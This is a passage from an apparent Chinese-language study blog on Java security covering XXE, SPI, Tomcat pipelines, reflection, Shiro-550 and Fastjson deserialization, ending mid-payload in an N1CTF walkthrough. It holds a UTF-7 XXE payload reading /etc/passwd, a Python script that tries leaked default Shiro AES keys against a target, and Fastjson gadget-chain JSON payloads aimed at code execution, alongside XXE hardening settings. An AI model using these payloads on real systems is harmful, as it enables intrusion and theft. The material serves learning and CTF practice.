<h3 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h3><p>可能支持的协议有<code>http/https/ftp/file/jar/netdoc/mailto/gopher</code>等但是不同版本支持的协议不一致，具体可以在具体java版本下的<code>sun.net.www.protocol</code>包下看到，这里不多讲了</p>
<h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><p>比如使用utf7</p>
<div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-7&quot;</span> ?&gt;</span>
+ADwAIQ-DOCTYPE ANY +AFs-
  +ADwAIQ-ENTITY f SYSTEM +ACI-file:///etc/passwd+ACIAPg-
+AF0APg-
+ADw-x+AD4AJg-f+ADsAPA-/x+AD4-</code></pre></div>

<p>可能造成XXE的组件及修复</p>
<div class="code-wrapper"><pre><code class="hljs pgsql">javax.xml.parsers.DocumentBuilderFactory;
javax.xml.parsers.SAXParser
javax.xml.<span class="hljs-keyword">transform</span>.TransformerFactory
javax.xml.validation.<span class="hljs-keyword">Validator</span>
javax.xml.validation.SchemaFactory
javax.xml.<span class="hljs-keyword">transform</span>.sax.SAXTransformerFactory
javax.xml.<span class="hljs-keyword">transform</span>.sax.SAXSource
org.xml.sax.XMLReader
DocumentHelper.parseText
DocumentBuilder
org.xml.sax.helpers.XMLReaderFactory
org.dom4j.io.SAXReader
org.jdom.<span class="hljs-keyword">input</span>.SAXBuilder
org.jdom2.<span class="hljs-keyword">input</span>.SAXBuilder
javax.xml.bind.Unmarshaller
javax.xml.xpath.XpathExpression
javax.xml.stream.XMLStreamReader
org.apache.commons.digester3.Digester
rg.xml.sax.SAXParseExceptionpublicId</code></pre></div>

<div class="code-wrapper"><pre><code class="hljs awk">先实例化组件
<span class="hljs-regexp">//</span>DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
<span class="hljs-regexp">//</span>SAXBuilder sb = new SAXBuilder();


<span class="hljs-regexp">//</span>禁用DTDs (doctypes),几乎可以防御所有xml实体攻击
dbf.setFeature(<span class="hljs-string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, true); <span class="hljs-regexp">//</span>首选
<span class="hljs-regexp">//</span>如果不能禁用DTDs,可以使用下两项，必须两项同时存在
dbf.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, false);        <span class="hljs-regexp">//</span>防止外部实体POC 
dbf.setFeature(<span class="hljs-string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, false);   <span class="hljs-regexp">//</span>防止参数实体POC</code></pre></div>

<h2 id="SPI"><a href="#SPI" class="headerlink" title="SPI"></a>SPI</h2><p>全称为Service Provider Interface，是一种服务发现机制。</p>
<p>通过在ClassPath路径下的<code>META-INF/services</code>文件夹查找文件，<strong>自动加载文件里所定义的类</strong></p>
<p>不知道哪出了问题，尝试不成功，只能拿大佬的图</p>
<p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918124151214.png" srcset="/img/loading.gif" lazyload alt="image-20230918124151214"></p>
<div class="code-wrapper"><pre><code class="hljs aspectj"><span class="hljs-keyword">package</span> com.yyds;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">SPIService</span> </span>&#123;
    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">execute</span><span class="hljs-params">()</span></span>;
&#125;</code></pre></div>

<div class="code-wrapper"><pre><code class="hljs angelscript">package com.yyds;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-symbol">SpiImpl</span> <span class="hljs-symbol">implements</span> <span class="hljs-symbol">SPIService</span>&#123;
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> execute() &#123;
        System.<span class="hljs-keyword">out</span>.println(<span class="hljs-string">&quot;SpiImpl 已经执行&quot;</span>);
    &#125;
&#125;</code></pre></div>

<p>在ClassPath路径下的resources中添加一个文件夹（即图中META-INF&#x2F;services）</p>
<p>再建文件名为<strong>包名+类名</strong>     内容为<strong>要执行的类</strong>的<code>包名+类名</code></p>
<p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918124447218.png" srcset="/img/loading.gif" lazyload alt="image-20230918124447218"></p>
<p>我们有两种方式可以实现，一种是通过<code>ServiceLoad.load()</code>方法，由<code>java.util</code>包提供</p>
<p>另一种是通过<code>Service.providers</code>方法拿到实现类的实例，由<code>sum.misc.Service</code>提供</p>
<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.yyds;

<span class="hljs-keyword">import</span> sun.misc.Service;

<span class="hljs-keyword">import</span> java.util.Iterator;
<span class="hljs-keyword">import</span> java.util.ServiceLoader;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Test</span> &#123;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;
        Iterator&lt;SPIService&gt; providers = Service.providers(SPIService.class);
        ServiceLoader&lt;SPIService&gt; load = ServiceLoader.load(SPIService.class);

        <span class="hljs-keyword">while</span>(providers.hasNext()) &#123;
            <span class="hljs-type">SPIService</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> providers.next();
            ser.execute();
        &#125;
        System.out.println(<span class="hljs-string">&quot;--------------------------------&quot;</span>);
        Iterator&lt;SPIService&gt; iterator = load.iterator();
        <span class="hljs-keyword">while</span>(iterator.hasNext()) &#123;
            <span class="hljs-type">SPIService</span> <span class="hljs-variable">ser</span> <span class="hljs-operator">=</span> iterator.next();
            ser.execute();
        &#125;
    &#125;
&#125;</code></pre></div>

<p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918124638694.png" srcset="/img/loading.gif" lazyload alt="image-20230918124638694"></p>
<h3 id="存在安全问题"><a href="#存在安全问题" class="headerlink" title="存在安全问题"></a>存在安全问题</h3><p>写一个恶意类，导致命令执行</p>
<p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918124744831.png" srcset="/img/loading.gif" lazyload alt="image-20230918124744831"></p>
<p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918124755156.png" srcset="/img/loading.gif" lazyload alt="image-20230918124755156"></p>
<h2 id="tomcat中容器的pipeline机制"><a href="#tomcat中容器的pipeline机制" class="headerlink" title="tomcat中容器的pipeline机制"></a>tomcat中容器的pipeline机制</h2><p>tomcat由Connector和Container两部分组成，有四种Container实现类，分别是StandardEngine、StandardHost、StandardContext、SrandardWrapper</p>
<p>请求到达<code>Engine</code>容器时，先调用了自己的一个组件去处理，这个组件是<code>pipeline</code>，相关的还有个容器内部的组件叫做<code>value</code>组件</p>
<p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918141720888.png" srcset="/img/loading.gif" lazyload alt="image-20230918141720888"></p>
<p>pipeline 管道    value 阀门</p>
<p><code>first</code>指向的是容器第一个非基础阀门的阀门，<code>first</code>在只有一个基础阀的时候并不会指向基础阀，因为如果指向基础阀的话就不需要判断非空然后返回基础阀了，这是个需要注意的点！</p>
<h2 id="类加载隔离方法"><a href="#类加载隔离方法" class="headerlink" title="类加载隔离方法"></a>类加载隔离方法</h2><h3 id="类隔离技术"><a href="#类隔离技术" class="headerlink" title="类隔离技术"></a>类隔离技术</h3><p>举例：</p>
<p>A、B两个jar包分别依赖了C的v1和v2版本，v2版本的Log类比v1版本新增了error方法，现在工程里面同时引入A和B两个jar包，以及C的v1和v2版本，打包时maven只能选择一个版本</p>
<p>默认情况下同一个项目的所有类都是用同一个类加载器加载的，所以不管你依赖了多少个版本的C，最终只会加载一个版本到<code>JVM</code>中</p>
<p>要是选择<code>v1</code>版本，当B去访问<code>Log.error</code>方法时就会抛出异常<code>java.lang.NoSuchMethodError</code></p>
<p>类冲突的问题若是向下兼容，把低版本排除即可，但若不向下兼容就陷入两难境地了</p>
<p>有人提出了类隔离技术来解决类冲突的问题</p>
<p>就是让每个模块使用独立的<strong>类加载器</strong>来加载</p>
<p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230918171447416.png" srcset="/img/loading.gif" lazyload alt="image-20230918171447416"></p>
<h3 id="实现类隔离"><a href="#实现类隔离" class="headerlink" title="实现类隔离"></a>实现类隔离</h3><h4 id="重写findClass"><a href="#重写findClass" class="headerlink" title="重写findClass"></a>重写findClass</h4><p>重写findClass会受到<strong>双亲委派机制</strong>的影响、不符合类隔离的目标</p>
<h4 id="重写loadClass"><a href="#重写loadClass" class="headerlink" title="重写loadClass"></a>重写loadClass</h4><h2 id="反射修改final修饰的变量"><a href="#反射修改final修饰的变量" class="headerlink" title="反射修改final修饰的变量"></a>反射修改final修饰的变量</h2><p>modifiers实际就是一个int类型的<code>26</code>，并且每个修饰符都有一个int的值，比如private是<code>2</code>，static是<code>8</code>，final是<code>16</code>那么我们只需要把目标属性的modifiers属性减去16，就相当于去除了final属性，而图中取反然后按位与操作就是这一步骤</p>
<div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.yyds;

<span class="hljs-keyword">import</span> java.lang.reflect.Field;
<span class="hljs-keyword">import</span> java.lang.reflect.Modifier;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestReflection</span> &#123;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;abc&quot;</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;
        <span class="hljs-type">TestReflection</span> <span class="hljs-variable">testReflection</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestReflection</span>();
        <span class="hljs-type">Field</span> <span class="hljs-variable">test</span> <span class="hljs-operator">=</span> testReflection.getClass().getDeclaredField(<span class="hljs-string">&quot;test&quot;</span>);
        <span class="hljs-type">Field</span> <span class="hljs-variable">modifier</span> <span class="hljs-operator">=</span> test.getClass().getDeclaredField(<span class="hljs-string">&quot;modifiers&quot;</span>);
        modifier.setAccessible(<span class="hljs-literal">true</span>);
        modifier.setInt(test,test.getModifiers() &amp; ~Modifier.FINAL);
        test.set(testReflection,<span class="hljs-string">&quot;success&quot;</span>);
        System.out.println(test.get(testReflection));
    &#125;
&#125;</code></pre></div>

<h1 id="基础链条"><a href="#基础链条" class="headerlink" title="基础链条"></a>基础链条</h1><h2 id="CC1-CC7"><a href="#CC1-CC7" class="headerlink" title="CC1-CC7"></a>CC1-CC7</h2><h2 id="shiro550-shiro-721"><a href="#shiro550-shiro-721" class="headerlink" title="shiro550     shiro 721"></a>shiro550     shiro 721</h2><p>1.2.4版本之前，固定key（kPH+bIxk5D2deZiIxcaaaA&#x3D;&#x3D;）加密</p>
<p>1.2.4以上的版本如何判断密钥是否正确呢？文章 <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzIzOTE1ODczMg==&mid=2247485052&idx=1&sn=b007a722e233b45982b7a57c3788d47d&scene=21#wechat_redirect">一种另类的 shiro 检测方式</a>提供了思路，当密钥不正确或类型转换异常时，目标 Response 包含 <code>Set-Cookie：rememberMe=deleteMe</code> 字段，而当密钥正确且没有类型转换异常时，返回包不存在 <code>Set-Cookie：rememberMe=deleteMe</code> 字段。</p>
<p>因此我们需要构造 payload 排除类型转换错误，进而准确判断密钥。</p>
<p>shiro 在 1.4.2 版本之前， AES 的模式为 CBC， IV 是随机生成的，并且 IV 并没有真正使用起来，所以整个 AES 加解密过程的 key 就很重要了，正是因为 AES 使用 Key 泄漏导致反序列化的 cookie 可控，从而引发反序列化漏洞。在 1.4.2 版本后，shiro 已经更换加密模式 AES-CBC 为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。</p>
<div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64
<span class="hljs-keyword">import</span> uuid
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES
 
<span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_AES_GCM</span>(<span class="hljs-params">msg, secretKey</span>):
    aesCipher = AES.new(secretKey, AES.MODE_GCM)
    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)
    <span class="hljs-keyword">return</span> (ciphertext, aesCipher.nonce, authTag)
 
<span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_rememberme</span>(<span class="hljs-params">target</span>):
    keys = [<span class="hljs-string">&#x27;kPH+bIxk5D2deZiIxcaaaA==&#x27;</span>, <span class="hljs-string">&#x27;4AvVhmFLUs0KTA3Kprsdag==&#x27;</span>,<span class="hljs-string">&#x27;66v1O8keKNV3TTcGPK1wzg==&#x27;</span>, <span class="hljs-string">&#x27;SDKOLKn2J1j/2BHjeZwAoQ==&#x27;</span>]     <span class="hljs-comment"># 此处简单列举几个密钥</span>
    BS = AES.block_size
    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()
    mode = AES.MODE_CBC
    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span>
 
    file_body = base64.b64decode(<span class="hljs-string">&#x27;rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==&#x27;</span>)
    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> keys:
        <span class="hljs-keyword">try</span>:
            <span class="hljs-comment"># CBC加密</span>
            encryptor = AES.new(base64.b64decode(key), mode, iv)
            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))
            res = requests.get(target, cookies=&#123;<span class="hljs-string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;,timeout=<span class="hljs-number">3</span>,verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)
            <span class="hljs-keyword">if</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>) == <span class="hljs-literal">None</span>:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确KEY ：&quot;</span> + key)
                <span class="hljs-keyword">return</span> key
            <span class="hljs-keyword">else</span>:
                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>):
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确key:&quot;</span> + key)
                    <span class="hljs-keyword">return</span> key
            <span class="hljs-comment"># GCM加密</span>
            encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))
            base64_ciphertext = base64.b64encode(encryptedMsg[<span class="hljs-number">1</span>] + encryptedMsg[<span class="hljs-number">0</span>] + encryptedMsg[<span class="hljs-number">2</span>])
            res = requests.get(target, cookies=&#123;<span class="hljs-string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;, timeout=<span class="hljs-number">3</span>, verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)
 
            <span class="hljs-keyword">if</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>) == <span class="hljs-literal">None</span>:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确KEY:&quot;</span> + key)
                <span class="hljs-keyword">return</span> key
            <span class="hljs-keyword">else</span>:
                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>):
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确key:&quot;</span> + key)
                    <span class="hljs-keyword">return</span> key
            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确key:&quot;</span> + key)
            <span class="hljs-keyword">return</span> key
        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
            <span class="hljs-built_in">print</span>(e)</code></pre></div>

<h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>服务端   客户端    注册中心</p>
<p>xx打xx的多个方式（实际上就是在读代码）</p>
<div class="code-wrapper"><pre><code class="hljs haxe"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">RemoteObj</span> <span class="hljs-keyword"><span class="hljs-keyword">extends</span> <span class="hljs-type">Remote</span></span> </span>&#123;  
  
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">String</span> sayHello(<span class="hljs-keyword">String</span> keywords) throws RemoteException;  
&#125;</code></pre></div>

<p>实现该接口的类要继承 <code>UnicastRemoteObject</code> </p>
<p>如果不能继承 UnicastRemoteObject 就需要手工导出 </p>
<p><code>UnicastRemoteObject.exportObject(this, 0);</code></p>
<p>继承 UnicastRemoteObject 类，用于生成 Stub（存根）和 Skeleton（骨架）</p>
<h2 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h2><p>new Reference()</p>
<p>new InitialContext()</p>
<h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><p>toJSONString() 调用getter</p>
<p>parse() 调用setter</p>
<p>parseObject()     既有parse 又有toJSON    所以 调用 setter和getter</p>
<p>getter自动调用还需要满足以下条件：</p>
<ul>
<li>方法名长度大于4</li>
<li>非静态方法</li>
<li>以get开头且第四个字母为大写</li>
<li>无参数传入</li>
<li>返回值类型继承自Collection Map AtomicBoolean AtomicInteger AtomicLong</li>
</ul>
<p>setter自动调用需要满足以下条件：</p>
<ul>
<li>方法名长度大于4</li>
<li>非静态方法</li>
<li>返回值为void或者当前类</li>
<li>以set开头且第四个字母为大写</li>
<li>参数个数为1个</li>
</ul>
<p>没有指定@type的，无论是parse还是parseObject都无法调用setter</p>
<p>Fastjson的一些其它功能点就是在为类属性调用getter&#x2F;setter时会调用<code>smartMatch()</code>忽略掉<code>_ -</code>字符串</p>
<h3 id="1-2-24"><a href="#1-2-24" class="headerlink" title="1.2.24"></a>1.2.24</h3><p>TemplatesImpl链</p>
<ul>
<li>fastjson反序列化时需有<code>Feature.SupportNonPublicField</code>参数</li>
<li><code>_bytecodes[]</code>需进行base64编码</li>
<li><code>_bytecodes[]</code>中加载的类需为<code>AbstractTranslet</code>的子类</li>
<li><code>_name</code>不为null</li>
<li><code>_tfactory</code>不为null</li>
<li>payload中记得带<code>&quot;_outputProperties&quot;:&#123; &#125;</code>，毕竟要调用<code>getoutputProperties</code></li>
<li>bytesValue对_bytecodes进行解码</li>
</ul>
<p>JdbcRowSetImpl链</p>
<p>…….</p>
<h2 id="后面的就是自己看文章的随便记录，太难了。。。。。"><a href="#后面的就是自己看文章的随便记录，太难了。。。。。" class="headerlink" title="后面的就是自己看文章的随便记录，太难了。。。。。"></a>后面的就是自己看文章的随便记录，太难了。。。。。</h2><h3 id="FastJSON调用getter常用两种方式，1、-ref，2、JSONObject。"><a href="#FastJSON调用getter常用两种方式，1、-ref，2、JSONObject。" class="headerlink" title="FastJSON调用getter常用两种方式，1、$ref，2、JSONObject。"></a>FastJSON调用getter常用两种方式，1、$ref，2、JSONObject。</h3><p>$ref：&gt;&#x3D;1.2.36</p>
<p>JSONObject：&lt;&#x3D;1.2.36</p>
<div class="code-wrapper"><pre><code class="hljs perl"><span class="hljs-number">1.2</span>.<span class="hljs-number">25</span>-<span class="hljs-number">1.2</span>.<span class="hljs-number">32</span>版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；
<span class="hljs-number">1.2</span>.<span class="hljs-number">33</span>-<span class="hljs-number">1.2</span>.<span class="hljs-number">47</span>版本：无论是否开启AutoTypeSupport，都能成功利用；


&#123;<span class="hljs-string">&quot;x&quot;</span>:&#123;<span class="hljs-string">&quot;xxx&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;,<span class="hljs-string">&quot;c&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;,<span class="hljs-string">&quot;www&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,<span class="hljs-string">&quot;c&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;,<span class="hljs-string">&quot;c&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>,<span class="hljs-string">&quot;driverClassLoader&quot;</span>:&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;,<span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;$$BCEL$$.....&quot;</span>&#125;&#125;:&#123;&#125;&#125;&#125;</code></pre></div>

<p>1.2.25-1.2.47都行，若不行，说明版本在1.2.25-1.2.32之间</p>
<p><strong>要想使用$ref赋值，则不能使用JSONObject调用getter</strong>，因为在parse时就会调用到getter方法，无法等到处理完$ref的任务后再调用getter</p>
<p>$ref要想在低版本(&lt;&#x3D;1.2.36)调用getter，要进行绕过</p>
<p>小于1.2.36 $ref调用getter</p>
<div class="code-wrapper"><pre><code class="hljs perl"><span class="hljs-comment">#恶意类放入mapping</span>

[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>&#125;,]</code></pre></div>

<div class="code-wrapper"><pre><code class="hljs powershell"><span class="hljs-comment">#调用getter</span>

[&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>, <span class="hljs-string">&quot;driverClassLoader&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">$ref</span>&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span>[1]&quot;</span>&#125;, <span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span><span class="hljs-variable">$BCEL</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>.....&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>,<span class="hljs-string">&quot;&quot;</span>:<span class="hljs-string">&quot;&quot;</span>&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;com.alibaba.fastjson.JSONObject&quot;</span>,<span class="hljs-string">&quot;connection&quot;</span>:&#123;&#125;&#125;,&#123;<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>:&#123;<span class="hljs-string">&quot;<span class="hljs-variable">$ref</span>&quot;</span>:<span class="hljs-string">&quot;<span class="hljs-variable">$</span>.connection&quot;</span>&#125;&#125;]</code></pre></div>

<p>源码分析，只能说每一步都是细节</p>
<h3 id="通过N1CTF了解做题顺序，以及后续操作"><a href="#通过N1CTF了解做题顺序，以及后续操作" class="headerlink" title="通过N1CTF了解做题顺序，以及后续操作"></a>通过N1CTF了解做题顺序，以及后续操作</h3><p>普通Tomcat项目的JSON.parse，题目改成了SpringBoot fastJsonHttpMessageConverters。</p>
<p>路径故意报错，看后端框架为springboot</p>
<p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230924161328311.png" srcset="/img/loading.gif" lazyload alt="image-20230924161328311"></p>
<p>指定@type</p>
<p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230924161506267.png" srcset="/img/loading.gif" lazyload alt="image-20230924161506267"></p>
<p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230924161445816.png" srcset="/img/loading.gif" lazyload alt="image-20230924161445816"></p>
<p>@type提交后发现后端产生了异常，而将@type放到value时不会产生异常，能够知道是因为设置了期望类导致type not match的原因，能够想到是SpringBoot常用FastJSON HttpMessageConverters方式。</p>
<p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230924161726647.png" srcset="/img/loading.gif" lazyload alt="image-20230924161726647"></p>
<p>返回正常说明fastjson版本&lt;1.2.48</p>
<p>改为<code>www.baidu.com</code></p>
<p><img src="/2023/09/18/%E8%B7%9F%E7%9D%80Y4tacker%E5%AD%A6java/image-20230924161839000.png" srcset="/img/loading.gif" lazyload alt="image-20230924161839000"></p>
<p>报错说明不存在DNS配置或不出网</p>
<p>然后去找是否存在RCE的利用类</p>
<div class="code-wrapper"><pre><code class="hljs perl">
&#123;
	<span class="hljs-string">&quot;a&quot;</span>:&#123;
		<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;java.lang.Class&quot;</span>,
		<span class="hljs-string">&quot;val&quot;</span>:<span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span>
	&#125;,
	<span class="hljs-string">&quot;b&quot;</span>:&#123;
		<span class="hljs-string">&quot;@type&quot;</span>:<span class="hljs-string">&quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;</span>
	&#125;,
	<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>,
	<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>
&#125;</code></pre></div>

<div class="code-wrapper"><pre><code class="hljs stylus">org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><span class="hljs-selector-class">.dbcp</span><span class="hljs-selector-class">.dbcp</span><span class="hljs-selector-class">.BasicDataSource</span> 
org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.tomcat</span><span class="hljs-selector-class">.dbcp</span><span class="hljs-selector-class">.dbcp2</span><span class="hljs-selector-class">.BasicDataSource</span> 
org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.ibatis</span><span class="hljs-selector-class">.datasource</span><span class="hljs-selector-class">.unpooled</span><span class="hljs-selector-class">.UnpooledDataSource</span>  (mybatis)</code></pre></div>

<p>发现是mybatis，直接</p>
<div class="code-wrapper"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;x&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;xxx&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;c&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;www&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.lang.Class&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span 